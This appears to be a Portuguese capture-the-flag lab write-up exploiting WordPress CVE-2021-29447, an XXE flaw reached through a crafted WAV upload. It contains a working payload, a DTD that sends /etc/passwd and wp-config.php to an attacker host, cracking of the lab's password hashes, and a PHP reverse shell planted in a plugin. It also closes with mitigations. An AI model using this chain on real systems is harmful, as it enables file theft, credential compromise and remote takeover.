<!-- ===================================== -->
<!--        WORDPRESS - CVE-2021-29447    -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Scenario-WordPress%20XXE%20Exploitation-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Environment-Web%20Application%20Pentest-blue?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Vulnerability-CVE--2021--29447-black?style=flat-square">
  <img src="https://img.shields.io/badge/Attack%20Vector-XXE%20(XML%20External%20Entity)-purple?style=flat-square">
  <img src="https://img.shields.io/badge/Impact-File%20Read%20%7C%20Data%20Exfiltration-yellow?style=flat-square">
  <img src="https://img.shields.io/badge/Platform-WordPress-informational?style=flat-square">
</p>

---

# 🐘 WordPress - CVE-2021-29447
## Exploração de XXE via Upload de Arquivo WAV

> Este documento apresenta a análise técnica e exploração completa da vulnerabilidade  
> **CVE-2021-29447**, uma falha crítica de **XML External Entity (XXE)** no WordPress.
>
> A vulnerabilidade afeta versões anteriores à **5.7.1** e permite que um atacante autenticado com permissões de upload:
>
> - 📂 Leia arquivos arbitrários do servidor
> - 📤 Exfiltre dados sensíveis (wp-config.php, /etc/passwd)
> - 🔓 Obtenha credenciais do banco de dados
> - 🧩 Escale o impacto até comprometimento total da aplicação
>
> O foco deste material é demonstrar **uma cadeia realista de exploração**, indo além da leitura de arquivos e alcançando:
>
> - Acesso ao banco MySQL
> - Quebra de hashes WordPress (PHPass)
> - Acesso administrativo
> - Execução de Reverse Shell
>
> A abordagem aplicada segue uma metodologia estruturada de Pentest:
>
> Reconhecimento → Exploração XXE → Extração de Credenciais → Pós-Exploração → Acesso Remoto

---

## 🎯 Objetivo Técnico

Durante este laboratório foram praticadas as seguintes competências:

- 🔍 Enumeração de WordPress com WPScan
- 🧬 Exploração prática de XXE
- 🗂 Leitura arbitrária de arquivos via `php://filter`
- 🔐 Extração e quebra de hashes com Hashcat
- 🛠 Escalada de impacto até execução remota de comandos
- 📊 Documentação técnica detalhada da cadeia de ataque

---

⚠️ Este material possui fins exclusivamente educacionais e foi executado em ambiente controlado e autorizado.

---
# WordPress - CVE-2021-29447

## 1. Introdução

### 1.1. Visão Geral do CVE-2021-29447

O **CVE-2021-29447** é uma vulnerabilidade crítica de **XXE (XML External Entity)** descoberta no WordPress, afetando versões anteriores a **5.7.1**. Esta falha permite que atacantes autenticados (com acesso de usuário com permissão para upload de mídia) executem ataques de injeção de XML externo, resultando em:

- **Leitura arbitrária de arquivos** no servidor
- **Exfiltração de dados sensíveis** (arquivos de configuração, bancos de dados)
- **Potencial execução remota de código** em cenários específicos

![XXE](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e86dbbd98fde62929a7e03b/room-content/5e86dbbd98fde62929a7e03b-1759492037932.png)

### 1.2. Impacto e Severidade

| Métrica                          | Valor                                          |
| -------------------------------- | ---------------------------------------------- |
| **CVSS v3.1 Score**              | 7.5 (Alto)                                     |
| **Vetor**                        | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Ataque**                       | Remoto                                         |
| **Complexidade**                 | Baixa                                          |
| **Privilégio Necessário**        | Baixo (usuário com upload)                     |
| **Impacto na Confidencialidade** | Alto                                           |

### 1.3. Como Funciona

A vulnerabilidade reside na forma como o WordPress processa arquivos de áudio **WAV** durante o upload. Especificamente, o parser de metadados da biblioteca **getID3** não valida corretamente entradas XML, permitindo que um atacante insira entidades XML personalizadas em um arquivo WAV malicioso.

Quando o arquivo é processado, as entidades XML são interpretadas pelo servidor, resultando em:

1. **Carregamento de um arquivo DTD externo** controlado pelo atacante
2. **Inclusão de arquivos locais** usando wrappers PHP (`php://filter`)
3. **Exfiltração dos dados** para o servidor do atacante via requisições HTTP

---
## 2. Reconhecimento Inicial com WPScan

### 2.1. Escaneamento Básico

O **WPScan** é uma ferramenta especializada em enumeração de vulnerabilidades WordPress. Utilizamos o comando básico para mapear o alvo:

```bash
wpscan --url http://[ALVO]
```

### 2.2. Análise dos Resultados

```text
[+] WordPress theme in use: twentytwentyone
 | Version: 1.1 (80% confidence)
 | [!] The version is out of date, the latest version is 2.7

[+] wp-security-hardening
 | Location: http://10.64.141.139/wp-content/plugins/wp-security-hardening/
 | Version: 1.2 (100% confidence)
 | [!] The version is out of date, the latest version is 1.2.8
```

**Interpretação dos Resultados:**

| Descoberta                                | Relevância                                                                                     |
| ----------------------------------------- | ---------------------------------------------------------------------------------------------- |
| Tema `twentytwentyone` versão 1.1         | Desatualizado, mas não diretamente relacionado ao CVE                                          |
| Plugin `wp-security-hardening` versão 1.2 | Plugin desatualizado (possíveis outras vulnerabilidades)                                       |
| **API Token ausente**                     | WPScan não mostrou vulnerabilidades específicas (necessário token para base de dados completa) |

### 2.3. Comando Aprimorado com API Token

Para obter resultados completos, recomenda-se usar um token da API WPScan (gratuito para 25 consultas diárias):

```bash
wpscan --url http://[ALVO] --api-token SEU_TOKEN_AQUI -e vp,vt,tt,cb,dbe,u,m
```

**Explicação das flags:**

- `-e vp`: Enumera plugins vulneráveis
- `-e vt`: Enumera temas vulneráveis
- `-e tt`: Enumera temas (todos)
- `-e cb`: Verifica backups de configuração
- `-e dbe`: Enumera bancos de dados expostos
- `-e u`: Enumera usuários
- `-e m`: Enumera mídias

---
## 3. Análise da Vulnerabilidade CVE-2021-29447

### 3.1. Pré-requisitos para Exploração

Para explorar o CVE-2021-29447, são necessários:

|Requisito|Status no Laboratório|
|---|---|
|WordPress < 5.7.1|✅ Provavelmente (versão não mostrada)|
|Usuário com permissão de upload|✅ (credenciais test-corp obtidas)|
|Acesso à biblioteca de mídia|✅|
|Servidor com PHP e extensão `libxml` habilitada|✅ (padrão)|

### 3.2. Técnica de Exploração

A exploração utiliza **XXE (XML External Entity)** através de arquivos WAV, que contêm uma seção `iXML` onde o XML malicioso é inserido. O fluxo do ataque é:

```text
1. Atacante cria arquivo WAV com XML malicioso
2. Atacante hospeda arquivo DTD externo em seu servidor
3. WordPress processa o WAV durante upload
4. XML é interpretado, carregando DTD externo
5. DTD externo instrui inclusão de arquivo local
6. Arquivo local é enviado (exfiltrado) para servidor do atacante
```

---
## 4. Exploração Passo a Passo

### 4.1. Acesso Inicial com Credenciais Padrão

A primeira etapa é obter acesso com um usuário que tenha permissão de upload. Neste laboratório, descobrimos credenciais padrão:

```text
Usuário: test-corp
Senha: test
```

Acessamos a página de login em:

```text
http://[ALVO]/wp-login.php
```

![Login](assets/Pasted%20image%2020260228170700.png)

### 4.2. Criação do Payload WAV

O payload é um arquivo WAV malicioso contendo XML na seção `iXML`. Utilizamos o comando abaixo para criá-lo:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://SEU_IP:PORTA/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

#### Explicação Detalhada do Payload:

|Parte do Payload|Descrição|
|---|---|
|`RIFF\xb8\x00\x00\x00WAVE`|Cabeçalho do arquivo WAV (formato válido)|
|`iXML\x7b\x00\x00\x00`|Indica seção iXML com tamanho 0x7b bytes|
|`<?xml version="1.0"?>`|Declaração XML|
|`<!DOCTYPE ANY[...]>`|Declaração de DTD personalizado|
|`<!ENTITY % remote SYSTEM ...>`|Define entidade que carrega DTD externo|
|`%remote;%init;%trick;`|Executa as entidades em sequência|

### 4.3. Configuração do Arquivo DTD

O arquivo DTD (`evil.dtd`) é o coração do ataque. Ele define as entidades que irão:

1. **Ler** arquivos locais do servidor WordPress
2. **Codificar** os dados para transmissão
3. **Enviar** para o servidor do atacante

Criamos o arquivo:

```bash
nano evil.dtd
```

Conteúdo:

```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://SEU_IP:PORTA/?p=%file;'>">
```

#### Explicação do DTD:

|Entidade|Função|
|---|---|
|`%file`|Lê `/etc/passwd`, aplica compressão zlib e codifica em base64|
|`%init`|Define entidade `trick` que envia `%file` como parâmetro GET|
|`%trick`|Executa a requisição HTTP para o servidor atacante|

**Wrappers PHP utilizados:**

- `php://filter/zlib.deflate`: Comprime os dados (evita problemas de encoding)
- `convert.base64-encode`: Converte binário para texto seguro em URL
- `resource=/etc/passwd`: Arquivo alvo

### 4.4. Configuração do Servidor Atacante

Iniciamos um servidor HTTP simples com Python para hospedar o DTD e receber os dados exfiltrados:

```bash
# Iniciar servidor na porta escolhida (ex: 8000)
php -S 0.0.0.0:8000
```

**Alternativa com Python:**

```bash
python3 -m http.server 8000
```

### 4.5. Upload do Payload

1. Acessamos a biblioteca de mídia:

```text
http://[UPLAD]/wp-admin/upload.php
```

![Mídia](assets/Pasted%20image%2020260228165708.png)

2. Clicamos em **"Add New"** e fazemos upload do arquivo `payload.wav`
3. Imediatamente, o servidor processa o arquivo e nossa entidade XML é ativada

### 4.6. Resultado da Exfiltração

No terminal do nosso servidor, recebemos:

```text
[SEU_IP:PORTA] GET /evil.dtd 200
[SEU_IP:PORTA] GET /?p=eJzzSM3JyVcIzy/KSVHwzCtJLUnk5QLyOFR8U1N4uQAAi0QKpA==
```

![Resultado do Payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e86dbbd98fde62929a7e03b/room-content/5e86dbbd98fde62929a7e03b-1759492037692.png)

O parâmetro `p` contém o conteúdo de `/etc/passwd` comprimido e codificado.

### 4.7. Decodificação dos Dados

Criamos um script PHP para decodificar os dados recebidos:

```bash
nano decode.php
```

```php
<?php echo zlib_decode(base64_decode('base64aqui')); ?>`
```

- `base64aqui`: aqui inserimos todo o resultado codificado e comprimido obtido pelo payload.

Executamos:

```bash
php decode.php
```

Resultado:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
stux:x:1000:1000:CVE-2021-29447,,,:/home/stux:/bin/bash
...
```

**Sucesso!** Conseguimos ler arquivos do servidor remoto.

---
## 5. Exploração Avançada: Arquivos Sensíveis

### 5.1. Extraindo o wp-config.php

O arquivo `wp-config.php` contém as credenciais do banco de dados WordPress. Alteramos o `evil.dtd` para lê-lo:

```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://SEU_IP:PORTA/?p=%file;'>">
```

- Repare que alteramos o local para `/var/www/html/wp-config.php`

Após novo upload do `payload.wav` e decodificação do resultado, obtemos informações sobre o arquivo de configuração do banco de dados Wordpress:

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpressdb2' );

/** MySQL database username */
define( 'DB_USER', 'thedarktangent' );

/** MySQL database password */
define( 'DB_PASSWORD', 'sUp3rS3cret132' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

**Credenciais encontradas:**

- Banco: `wordpressdb2`
- Usuário: `thedarktangent`
- Senha: `sUp3rS3cret132`

---
## 6. Acesso ao Banco de Dados MySQL

### 6.1. Verificação do Serviço MySQL

Primeiro, verificamos se o MySQL está acessível:

```bash
nmap -sC -sV [ALVO]
```

Resultado:

```text
3306/tcp open  mysql   MySQL 5.7.33-0ubuntu0.16.04.1
```

### 6.2. Conexão ao Banco

```bash
mysql -h [ALVO] -u thedarktangent -p --skip-ssl
```

**Explicação do comando:**

- `-h`: Host do banco
- `-u`: Usuário
- `-p`: Solicita senha
- `--skip-ssl`: Ignora SSL (necessário quando servidor não suporta)

Em seguida inserimos a senha obtida:

```bash
Enter password: sUp3rS3cret132
```

### 6.3. Enumeração do Banco

1. Listar os banco de dados:

```mysql
MySQL [(none)]> show databases; 
```

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpressdb2       |
+--------------------+
```

3. Selecionar banco alvo:

```mysql
MySQL [(none)]> use wordpressdb2;
```

4. Listar tabelas:

```mysql
MySQL [wordpressdb2]> show tables;
```

```text
+--------------------------+
| Tables_in_wordpressdb2   |
+--------------------------+
| wptry_commentmeta        |
| wptry_comments           |
| wptry_links              |
| wptry_options            |
| wptry_postmeta           |
| wptry_posts              |
| wptry_term_relationships |
| wptry_term_taxonomy      |
| wptry_termmeta           |
| wptry_terms              |
| wptry_usermeta           |
| wptry_users              |
+--------------------------+
```

5. Visualizar conteúdo de tabela de usuários:

```mysql
MySQL [wordpressdb2]> select * from wptry_users;
```

```text
+----+------------+------------------------------------+---------------+------------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email                   |
|  1 | corp-001   | $P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1 | corp-001      | corp-001@fakemail.com        |
|  2 | test-corp  | $P$Bk3Zzr8rb.5dimh99TRE1krX8X85eR0 | test-corp     | test-corp@tryhackme.fakemail |
+----+------------+------------------------------------+---------------+------------------------------+
```

### 6.4. Entendendo os Hashes

O formato `$P$` indica **PHPass (Portable PHP password hashing framework)**, usado pelo WordPress para armazenar senhas. Características:

- **Salt incorporado** no próprio hash
- **Base64 modificado** (caracteres `./0-9A-Za-z`)
- **Iterações** (costuma ser 8192)

---
## 7. Quebra de Hashes com Hashcat

### 7.1. Identificação do Hash

```bash
hashid '$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1'
```

Resultado:

```text
Analyzing '$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1'
[+] Wordpress ≥ v2.6.2 [Hashcat Mode: 400]
[+] Joomla ≥ v2.5.18 [Hashcat Mode: 400]
[+] PHPass' Portable Hash [Hashcat Mode: 400]
```

### 7.2. Preparação para Quebra

```bash
# Salvar hash em arquivo
echo '$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1' > hash.txt

# Verificar formato (Wordpress mode 400)
hashcat --example-hashes | grep -A5 -B5 "400"
```

### 7.3. Executando o Hashcat

```bash
hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Explicação das flags:**

- `-m 400`: Modo WordPress/phpBB (PHPass)
- `-a 0`: Ataque de dicionário (wordlist)

**Resultado:**

```text
$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1:teddybear
```

- **Senha quebrada:** `teddybear`

---
## 8. Acesso Administrativo ao WordPress

Com as credenciais do usuário `corp-001`:

```text
Usuário: corp-001
Senha: teddybear
```

Podemos acessar o painel administrativo:

![New Login](assets/Pasted%20image%2020260228172017.png)

---
## 9. Obtenção de Reverse Shell

### 9.1. Injeção de Shell em Plugin

A técnica consiste em modificar um plugin existente para incluir código malicioso.

1. **Navegar:** Plugins → Editor de Plugins
2. **Selecionar:** Plugin "Hello Dolly"
3. **Arquivo:** `hello.php`

![Plugin Editor](assets/Pasted%20image%2020260228172416.png)

### 9.2. Código do Reverse Shell

Utilizamos o **[PHP Reverse Shell do PentestMonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)**:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = 'SEU_IP';  // ALTERAR PARA SEU IP
$port = 4444;     // ALTERAR CONFORME NECESSÁRIO
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

// ... (resto do código)
?>
```

### 9.3. Configuração do Listener

```bash
# Terminal 1 - Listener
nc -lvnp 4444
```

**Explicação do Netcat:**

- `-l`: Modo listen (escuta)
- `-v`: Verboso (mostra detalhes)
- `-n`: Não resolve DNS
- `-p`: Porta especificada

### 9.4. Ativação do Shell

Após atualizar o plugin, acessamos:

```text
http://[ALVO]/wp-content/plugins/hello.php
```

Imediatamente, recebemos conexão:

```text
listening on [any] 4444 ...
connect to [192.168.164.22] from (UNKNOWN) [10.66.129.186] 44854
Linux ubuntu 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

### 9.5. Melhorando o Shell Interativo

```bash
# Spawn TTY (melhora interatividade)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Ou com script (se python não disponível)
script /dev/null -c bash

# Background (Ctrl+Z) e depois:
stty raw -echo; fg
```

---
## 10. Coleta da Flag

### 10.1. Busca pela Flag

```bash
# Buscar arquivos chamados flag.txt
find / -name "flag.txt" 2>/dev/null

# Buscar arquivos que começam com "flag"
find / -name "flag*" 2>/dev/null
```

Resultado:

```text
/home/stux/flag/flag.txt
```

### 10.2. Leitura da Flag

```bash
cat /home/stux/flag/flag.txt
```

```text
thm{28bd2a5b7e0586a6e94ea3e0adbd5f2f16085c72}
```

---
## 12. Conclusão e Lições Aprendidas

### 12.1. Resumo da Exploração

Este laboratório demonstrou uma cadeia completa de ataque a um WordPress vulnerável:

1. **Reconhecimento** com WPScan
2. **Exploração de XXE** (CVE-2021-29447) para leitura de arquivos
3. **Extração de credenciais** do banco de dados
4. **Acesso ao MySQL** e obtenção de hashes
5. **Quebra de hashes** com Hashcat
6. **Acesso administrativo** e reverse shell
7. **Coleta da flag**

### 12.2. Principais Aprendizados

|Lição|Descrição|
|---|---|
|**Segurança em Camadas**|Uma única vulnerabilidade (XXE) levou a comprometimento total|
|**Importância de Atualizações**|WordPress 5.7.1+ não é vulnerável ao CVE|
|**Senhas Fortes**|"test" e "teddybear" são facilmente quebráveis|
|**Princípio do Menor Privilégio**|Usuário test-corp não deveria ter upload|
|**Monitoramento**|Upload de arquivos WAV incomuns deveria gerar alertas|

### 12.3. Recomendações de Mitigação

|Recomendação|Prioridade|Descrição|
|---|---|---|
|Atualizar WordPress|🔴 Alta|Versão 5.7.1+ corrige o CVE-2021-29447|
|Fortalecer senhas|🔴 Alta|Política de senhas fortes e MFA|
|Validar uploads|🟡 Média|Verificar magic bytes e não apenas extensão|
|Monitorar XXE|🟡 Média|Detectar requisições DTD externas|
|Backup regular|🟢 Baixa|Facilitar recuperação pós-incidente|

---
## 13. Referências

### 13.1. Documentação Oficial

- [CVE-2021-29447 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)
- [WordPress 5.7.1 Security Release](https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/)
- [WPScan Documentation](https://github.com/wpscanteam/wpscan)

### 13.2. Artigos Técnicos

- [SonarSource: WordPress XXE Vulnerability Analysis](https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/)
- [PentestMonkey PHP Reverse Shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

### 13.3. Ferramentas Utilizadas

|Ferramenta|Função|Link|
|---|---|---|
|WPScan|Scanner WordPress|[wpscan.com](https://wpscan.com)|
|Hashcat|Quebra de hashes|[hashcat.net](https://hashcat.net)|
|Netcat|Listener reverse shell|[nc110.sourceforge.net](http://nc110.sourceforge.net)|
|MySQL Client|Acesso a banco|[mysql.com](https://www.mysql.com)|
